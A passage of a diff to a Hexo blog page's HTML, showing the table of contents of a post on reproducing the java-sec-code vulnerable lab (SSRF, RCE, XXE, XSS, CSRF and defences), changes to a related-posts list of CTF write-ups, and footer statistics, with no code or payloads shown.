&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1ssrfopenstream"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 3. 路由 &#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1ssrfhttpsyncclientsvuln"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 4. 路由 &#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1ssrfresttemplatevuln1"><span class="toc-number">1.6.5.</span> <span class="toc-text"> 5. 路由 &#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E8%B7%AF%E7%94%B1ssrfresttemplatevuln2"><span class="toc-number">1.6.6.</span> <span class="toc-text"> 6. 路由 &#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E8%B7%AF%E7%94%B1ssrfhutoolvuln"><span class="toc-number">1.6.7.</span> <span class="toc-text"> 7. 路由 &#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E8%B7%AF%E7%94%B1ssrfdenrebindvuln"><span class="toc-number">1.6.8.</span> <span class="toc-text"> 8. 路由 &#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.6.9.</span> <span class="toc-text"> DNS 重绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dns"><span class="toc-number">1.6.9.1.</span> <span class="toc-text"> dns:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E7%9A%84%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.9.2.</span> <span class="toc-text"> DNS 的记录类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF"><span class="toc-number">1.6.9.3.</span> <span class="toc-text"> DNS 绑定技术：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-2"><span class="toc-number">1.6.9.4.</span> <span class="toc-text"> DNS 重绑定：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%80%9D%E8%B7%AF"><span class="toc-number">1.6.9.5.</span> <span class="toc-text"> 防御思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce"><span class="toc-number">1.7.</span> <span class="toc-text"> rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1rceruntimeexec"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 1. 路由 &#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1rceprocessbuilder"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 2. 路由 &#x2F;rce&#x2F;processBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1rcejscmd"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 3. 路由 &#x2F;rce&#x2F;jscmd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#image-20250710111939201"><span class="toc-number">1.7.3.1.</span> <span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1rcevulnyarm"><span class="toc-number">1.7.4.</span> <span class="toc-text"> 4. 路由 &#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1rcegroovy"><span class="toc-number">1.7.5.</span> <span class="toc-text"> 5. 路由 &#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti"><span class="toc-number">1.8.</span> <span class="toc-text"> SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#velocityevaluate"><span class="toc-number">1.8.1.</span> <span class="toc-text"> Velocity.evaluate</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf"><span class="toc-number">1.9.</span> <span class="toc-text"> CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1csrfpost"><span class="toc-number">1.9.1.</span> <span class="toc-text"> 1. 路由 &#x2F;csrf&#x2F;post</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-sec-code%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text"> java-sec-code 靶场复现：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdinject"><span class="toc-number">1.1.</span> <span class="toc-text"> Cmdinject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject"><span class="toc-number">1.1.1.</span> <span class="toc-text"> &#x2F;codeinject</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#start%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.1.1.</span> <span class="toc-text"> start（）函数详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8A%8A%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text"> 1. 把命令参数转换为字符串数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8F%82%E6%95%B0%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text"> 2. 参数检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%90%8D%E5%91%BD%E4%BB%A4%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%83%E7%B4%A0"><span class="toc-number">1.1.1.1.3.</span> <span class="toc-text"> 3. 获取要执行的程序名（命令第一个元素）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.1.4.</span> <span class="toc-text"> 4. 安全管理器检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E6%89%A7%E8%A1%8C%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.1.1.5.</span> <span class="toc-text"> 5. 获取执行目录路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E6%A3%80%E6%9F%A5%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E4%B8%AD%E6%98%AF%E5%90%A6%E5%90%AB%E6%9C%89%E9%9D%9E%E6%B3%95%E7%9A%84%E7%A9%BA%E5%AD%97%E7%AC%A6"><span class="toc-number">1.1.1.1.6.</span> <span class="toc-text"> 6. 检查命令参数中是否含有非法的空字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.1.1.1.7.</span> <span class="toc-text"> 7. 启动进程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinjecthost"><span class="toc-number">1.1.2.</span> <span class="toc-text"> &#x2F;codeinject&#x2F;host</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp"><span class="toc-number">1.2.</span> <span class="toc-text"> jsonp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.</span> <span class="toc-text"> 文件上传：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.4.</span> <span class="toc-text"> 目录穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#raw-sql"><span class="toc-number">1.5.0.1.</span> <span class="toc-text"> raw sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#incorrect-preparestatement"><span class="toc-number">1.5.0.2.</span> <span class="toc-text"> Incorrect prepareStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#incorrect-mybatis"><span class="toc-number">1.5.0.3.</span> <span class="toc-text"> Incorrect mybatis</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88"><span class="toc-number">1.5.0.3.1.</span> <span class="toc-text"> 防护方案：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">1.6.</span> <span class="toc-text"> ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1ssrfurlconnectionvuln"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1. 路由 &#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1ssrfhttpurlconnectionvuln"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2. 路由 &#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1ssrfopenstream"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 3. 路由 &#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1ssrfhttpsyncclientsvuln"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 4. 路由 &#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1ssrfresttemplatevuln1"><span class="toc-number">1.6.5.</span> <span class="toc-text"> 5. 路由 &#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E8%B7%AF%E7%94%B1ssrfresttemplatevuln2"><span class="toc-number">1.6.6.</span> <span class="toc-text"> 6. 路由 &#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E8%B7%AF%E7%94%B1ssrfhutoolvuln"><span class="toc-number">1.6.7.</span> <span class="toc-text"> 7. 路由 &#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E8%B7%AF%E7%94%B1ssrfdenrebindvuln"><span class="toc-number">1.6.8.</span> <span class="toc-text"> 8. 路由 &#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.6.9.</span> <span class="toc-text"> DNS 重绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dns"><span class="toc-number">1.6.9.1.</span> <span class="toc-text"> dns:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E7%9A%84%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.9.2.</span> <span class="toc-text"> DNS 的记录类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF"><span class="toc-number">1.6.9.3.</span> <span class="toc-text"> DNS 绑定技术：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-2"><span class="toc-number">1.6.9.4.</span> <span class="toc-text"> DNS 重绑定：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%80%9D%E8%B7%AF"><span class="toc-number">1.6.9.5.</span> <span class="toc-text"> 防御思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce"><span class="toc-number">1.7.</span> <span class="toc-text"> rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1rceruntimeexec"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 1. 路由 &#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1rceprocessbuilder"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 2. 路由 &#x2F;rce&#x2F;processBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1rcejscmd"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 3. 路由 &#x2F;rce&#x2F;jscmd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#image-20250710111939201"><span class="toc-number">1.7.3.1.</span> <span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1rcevulnyarm"><span class="toc-number">1.7.4.</span> <span class="toc-text"> 4. 路由 &#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1rcegroovy"><span class="toc-number">1.7.5.</span> <span class="toc-text"> 5. 路由 &#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti"><span class="toc-number">1.8.</span> <span class="toc-text"> SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#velocityevaluate"><span class="toc-number">1.8.1.</span> <span class="toc-text"> Velocity.evaluate</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf"><span class="toc-number">1.9.</span> <span class="toc-text"> CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1csrfpost"><span class="toc-number">1.9.1.</span> <span class="toc-text"> 1. 路由 &#x2F;csrf&#x2F;post</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#csrf%E9%98%B2%E6%8A%A4"><span class="toc-number">1.9.1.1.</span> <span class="toc-text"> csrf 防护：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8csrf-token"><span class="toc-number">1.9.1.1.1.</span> <span class="toc-text"> 使用 CSRF Token：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#samesite-cookie-%E5%B1%9E%E6%80%A7"><span class="toc-number">1.9.1.1.2.</span> <span class="toc-text"> SameSite Cookie 属性：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8C%E9%87%8Dcookie%E9%AA%8C%E8%AF%81"><span class="toc-number">1.9.1.1.3.</span> <span class="toc-text"> 双重 Cookie 验证：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5referer%E5%A4%B4"><span class="toc-number">1.9.1.1.4.</span> <span class="toc-text"> 检查 Referer 头：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#captcha"><span class="toc-number">1.9.1.1.5.</span> <span class="toc-text"> CAPTCHA：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E8%AF%B7%E6%B1%82%E6%9D%A5%E6%BA%90"><span class="toc-number">1.9.1.1.6.</span> <span class="toc-text"> 限制请求来源：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.10.</span> <span class="toc-text"> XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1xssreflext"><span class="toc-number">1.10.1.</span> <span class="toc-text"> 1. 路由 &#x2F;xss&#x2F;reflext：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1xssstored"><span class="toc-number">1.10.2.</span> <span class="toc-text"> 2. 路由 &#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-number">1.10.3.</span> <span class="toc-text"> XSS 攻击防护：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe"><span class="toc-number">1.11.</span> <span class="toc-text"> XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1xxexmlreadervuln"><span class="toc-number">1.11.1.</span> <span class="toc-text"> 1. 路由 &#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1xxesaxbuildervuln"><span class="toc-number">1.11.2.</span> <span class="toc-text"> 2. 路由 &#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">1.11.2.1.</span> <span class="toc-text"> 修复代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1xxesaxreadervuln"><span class="toc-number">1.11.3.</span> <span class="toc-text"> 3. 路由 &#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">1.11.4.</span> <span class="toc-text"> 通用的做法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#external-dtd%E5%A4%96%E9%83%A8-dtd-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93parameter-entity%E5%AE%9E%E7%8E%B0%E7%9A%84-blind-xxe-%E5%A4%96%E5%B8%A6%E6%94%BB%E5%87%BB"><span class="toc-number">1.11.4.1.</span> <span class="toc-text"> External DTD（外部 DTD）+ 参数实体（Parameter Entity）实现的 Blind XXE 外带攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1xxesaxparservuln"><span class="toc-number">1.11.5.</span> <span class="toc-text"> 4. 路由 &#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1xxedigestervuln"><span class="toc-number">1.11.6.</span> <span class="toc-text"> 5. 路由 &#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E8%B7%AF%E7%94%B1xxedocumentbuildervuln"><span class="toc-number">1.11.7.</span> <span class="toc-text"> 6. 路由 &#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E8%B7%AF%E7%94%B1xxedocumentbuilderxincludevuln"><span class="toc-number">1.11.8.</span> <span class="toc-text"> 7. 路由 &#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E8%B7%AF%E7%94%B1xxexmlreadervuln"><span class="toc-number">1.11.9.</span> <span class="toc-text"> 8. 路由 &#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E8%B7%AF%E7%94%B1xxedocumenthelpervuln"><span class="toc-number">1.11.10.</span> <span class="toc-text"> 9. 路由 &#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8xxe%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-number">1.11.11.</span> <span class="toc-text"> 上述存在 XXE 漏洞库对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload"><span class="toc-number">1.11.11.1.</span> <span class="toc-text"> 统一漏洞利用 payload：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">1.11.11.2.</span> <span class="toc-text"> 统一修复代码：</span></a></li></ol></li></ol></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -802,30 +1071,10 @@ String template：要评估的模板字符串
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<a href="/categories/misc/" title="In misc">misc</a>
 </div>
 
-    <span><a href="/2024/07/30/Shop/" title="Shop">Shop</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
-</div>
-
-    <span><a href="/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/" title="SHctf-2024部分复现">SHctf-2024部分复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2024/11/18/FBCTF2019-Products-Manager/" title="[FBCTF2019]Products-Manager">[FBCTF2019]Products-Manager</a></span>
+    <span><a href="/2024/11/04/%E6%96%87%E4%BB%B6%E9%87%8C%E7%9A%84%E7%A7%98%E5%AF%86/" title="文件里的秘密">文件里的秘密</a></span>
   </li>
 
       
@@ -833,9 +1082,21 @@ String template：要评估的模板字符串
     
 <div class="breadcrumb">
 <a href="/categories/misc/" title="In misc">misc</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/misc/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2025/05/06/MRCTF2020-ezmisc/" title="[MRCTF2020]ezmisc">[MRCTF2020]ezmisc</a></span>
+    <span><a href="/2025/03/10/%E8%8F%9C%E5%88%80666/" title="菜刀666">菜刀666</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/02/09/NewStarCTF%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two/" title="[NewStarCTF公开赛赛道]BabySSTI_Two">[NewStarCTF公开赛赛道]BabySSTI_Two</a></span>
   </li>
 
       
@@ -857,37 +1118,16 @@ String template：要评估的模板字符串
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/04/29/5-txt/" title="buuctf4月29日">buuctf4月29日</a></span>
+    <span><a href="/2024/08/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFUpload%E9%A2%98/" title="2019强网杯Upload题">2019强网杯Upload题</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
 </div>
 
-    <span><a href="/2024/04/28/1_1/" title="buuctf4月27日">buuctf4月27日</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2024/09/23/XNUCA2019Qualifier-EasyPHP/" title="[XNUCA2019Qualifier]EasyPHP">[XNUCA2019Qualifier]EasyPHP</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
-</div>
-
-    <span><a href="/2024/12/10/%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="国城杯">国城杯</a></span>
+    <span><a href="/2024/11/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/" title="java反序列化入门">java反序列化入门</a></span>
   </li>
 
       
@@ -898,6 +1138,36 @@ String template：要评估的模板字符串
 </div>
 
     <span><a href="/2024/06/10/2018-Comment/" title="&#39;[网鼎杯 2018]Comment&#39;">'[网鼎杯 2018]Comment'</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/07/25/2019-Web-Unagi/" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/04/28/3-txt/" title="buuctf4月27日">buuctf4月27日</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+</div>
+
+    <span><a href="/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="aliyunctf部分复现">aliyunctf部分复现</a></span>
   </li>
 
   </ul>
@@ -922,13 +1192,13 @@ String template：要评估的模板字符串
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="Symbols count total">636k words</span>
+    <span title="Symbols count total">647k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="Reading time total">9:38</span>
+    <span title="Reading time total">9:48</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
